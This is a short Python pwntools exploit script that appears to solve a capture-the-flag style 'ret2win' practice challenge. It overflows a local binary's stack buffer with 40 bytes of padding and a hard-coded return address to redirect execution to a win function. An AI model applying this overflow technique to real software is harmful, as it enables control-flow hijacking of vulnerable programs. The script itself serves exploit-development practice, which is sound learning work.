from pwn import *

p = process('./ret2win')
context.log_level = 'CRITICAL'

ret2win_addr = p64(0x400811)

exploit = ''
exploit += 'A' * 40
exploit += ret2win_addr

p.recv()
p.sendline(exploit)
print p.recvline()

